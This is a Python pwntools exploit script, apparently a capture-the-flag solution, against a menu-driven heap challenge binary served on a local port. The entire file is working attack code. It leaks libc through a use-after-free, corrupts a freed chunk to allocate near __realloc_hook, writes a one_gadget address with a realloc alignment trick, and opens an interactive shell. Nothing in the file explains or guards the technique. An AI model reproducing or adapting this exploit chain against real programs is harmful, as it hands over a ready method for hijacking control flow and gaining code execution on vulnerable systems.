from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
elf = context.binary = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld_name = './ld-linux-x86-64.so.2'
context.terminal = ['tmux', 'splitw', '-h']

HOST = '127.0.0.1'
PORT = 6666
server = None

#webpwn起始点
def start():
    global server
    if args.LOCAL:
        server = process([ld_name, '--library-path', '.', elf.path])
        sleep(0.2)
    return remote(HOST, PORT)


io = start()
ru = lambda x: io.recvuntil(x)


def cmd(choice):
    ru(b'>')
    io.send(p32(choice))


def build(index, size, content=b''):
    return p64(index) + p64(size) + content.ljust(0x90, b'\x00')


def add(index, size, content=b''):
    cmd(1)
    ru(b'>')
    io.send(build(index, size, content))


def edit(index, size, content):
    cmd(2)
    ru(b'>')
    io.send(build(index, size, b'ziran\x00'))
    ru(b'starting to edit:\n')
    io.send(content)


def delete(index):
    cmd(3)
    ru(b'>')
    io.send(build(index, 0, b''))


def show(index):
    cmd(4)
    ru(b'>')
    io.send(build(index, 0, b''))

def pwn():
    add(0, 0x90, b'A' * 0x10)
    add(1, 0x10, b'B' * 0x10)
    delete(0)
    show(0)
    ru(b'leaking...\n')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - 0x3c4b78
    log.success(f'libc base = {hex(libc.address)}')

    realloc_hook = libc.sym['__realloc_hook']
    malloc_hook = libc.sym['__malloc_hook']
    realloc = libc.sym['realloc']
    ogg = libc.address + 0x4527a

    log.success(f'__realloc_hook = {hex(realloc_hook)}')
    log.success(f'__malloc_hook = {hex(malloc_hook)}')
    log.success(f'realloc = {hex(realloc)}')
    log.success(f'one_gadget = {hex(ogg)}')

    add(2, 0x60, b'C')
    delete(2)
    edit(2, 8, p64(realloc_hook - 0x1b))
    add(3, 0x60, b'D')
    add(4, 0x60, b'E')

    payload = b'A' * 0xb + p64(ogg) + p64(realloc + 0x10)
    edit(4, len(payload), payload)
    
    cmd(1)


if __name__ == '__main__':
    pwn()
    io.interactive()
